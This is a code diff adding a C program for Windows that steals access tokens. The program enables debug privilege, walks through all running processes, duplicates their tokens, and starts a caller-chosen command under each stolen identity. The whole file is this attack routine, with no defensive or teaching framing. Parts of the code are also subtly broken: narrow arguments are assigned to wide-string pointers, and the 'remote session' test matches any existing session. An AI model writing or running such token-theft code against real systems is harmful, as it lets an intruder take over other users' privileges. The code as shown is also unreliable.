@@ -1,0 +1,194 @@
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+#include <wtsapi32.h>
+
+#pragma comment(lib, "wtsapi32.lib")
+
+// Function to enable a specified privilege for the current process
+BOOL EnablePrivilege(LPCWSTR privilege) {
+    HANDLE token = NULL;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    BOOL result = FALSE;
+
+    // Open the process token
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
+        printf("OpenProcessToken error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    // Lookup the LUID for the specified privilege
+    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
+        printf("LookupPrivilegeValue error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    // Set up the TOKEN_PRIVILEGES structure
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Adjust the token privileges
+    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    result = TRUE;
+
+cleanup:
+    if (token) {
+        CloseHandle(token);
+    }
+    return result;
+}
+
+// Function to check if a process is running in a remote session
+BOOL IsRemoteSession(DWORD processId) {
+    DWORD sessionId;
+    PWTS_SESSION_INFO pSessionInfo = NULL;
+    DWORD count;
+    BOOL result = FALSE;
+
+    // Get the session ID for the specified process
+    if (!ProcessIdToSessionId(processId, &sessionId)) {
+        printf("ProcessIdToSessionId error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    // Enumerate all sessions on the current server
+    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count)) {
+        for (DWORD i = 0; i < count; ++i) {
+            if (pSessionInfo[i].SessionId == sessionId) {
+                result = TRUE;
+                goto cleanup;
+            }
+        }
+    } else {
+        printf("WTSEnumerateSessions error: %u\n", GetLastError());
+    }
+
+cleanup:
+    if (pSessionInfo) {
+        WTSFreeMemory(pSessionInfo);
+    }
+    return result;
+}
+
+// Function to duplicate a token from a process and create a new process with that token
+BOOL DuplicateTokenAndCreateProcess(DWORD processId, LPCWSTR executablePath, LPCWSTR commandLine) {
+    HANDLE hProcess = NULL;
+    HANDLE hToken = NULL;
+    HANDLE hNewToken = NULL;
+    PROCESS_INFORMATION pi = {0};
+    BOOL result = FALSE;
+
+    // Open the specified process
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
+    if (hProcess == NULL) {
+        printf("OpenProcess error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    // Open the process token
+    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
+        printf("OpenProcessToken error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    // Duplicate the token
+    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
+        printf("DuplicateTokenEx error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    // Set up the STARTUPINFO structure
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+
+    // Create a new process with the duplicated token
+    if (!CreateProcessWithTokenW(hNewToken, 0, executablePath, commandLine, 0, NULL, NULL, &si, &pi)) {
+        printf("CreateProcessWithTokenW error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    result = TRUE;
+
+cleanup:
+    if (hNewToken) {
+        CloseHandle(hNewToken);
+    }
+    if (hToken) {
+        CloseHandle(hToken);
+    }
+    if (hProcess) {
+        CloseHandle(hProcess);
+    }
+    if (pi.hProcess) {
+        CloseHandle(pi.hProcess);
+    }
+    if (pi.hThread) {
+        CloseHandle(pi.hThread);
+    }
+    return result;
+}
+
+int main(int argc, char *argv[]) {
+    HANDLE hSnapshot = NULL;
+    PROCESSENTRY32 pe;
+    LPCWSTR executablePath = NULL;
+    LPCWSTR commandLine = NULL;
+
+    // Check if the correct number of arguments are provided
+    if (argc < 3) {
+        printf("Usage: %s <executable_path> <command_line>\n", argv[0]);
+        return 1;
+    }
+
+    // Get the executable path and command line from the arguments
+    executablePath = argv[1];
+    commandLine = argv[2];
+
+    // Enable the SE_DEBUG_NAME privilege
+    if (!EnablePrivilege(SE_DEBUG_NAME)) {
+        printf("Failed to enable SE_DEBUG_NAME privilege.\n");
+        goto cleanup;
+    }
+
+    // Create a snapshot of all processes
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("CreateToolhelp32Snapshot error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    pe.dwSize = sizeof(PROCESSENTRY32);
+
+    // Get the first process in the snapshot
+    if (!Process32First(hSnapshot, &pe)) {
+        printf("Process32First error: %u\n", GetLastError());
+        goto cleanup;
+    }
+
+    // Iterate through all processes in the snapshot
+    do {
+        if (pe.th32ProcessID != 0 && pe.th32ParentProcessID != 0) {
+            printf("Process ID: %u, Executable: %s\n", pe.th32ProcessID, pe.szExeFile);
+
+            // Check if the process is running in a remote session
+            if (IsRemoteSession(pe.th32ProcessID)) {
+
+                // Duplicate the token and create a new process with it
+                if (DuplicateTokenAndCreateProcess(pe.th32ProcessID, executablePath, commandLine)) {
+                    printf("Successfully created process with token from process ID: %u\n", pe.th32ProcessID);
+                }
+            }
+        }
+    } while (Process32Next(hSnapshot, &pe));
+
+cleanup:
+    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
+        CloseHandle(hSnapshot);
+    }
+    return 0;
+}
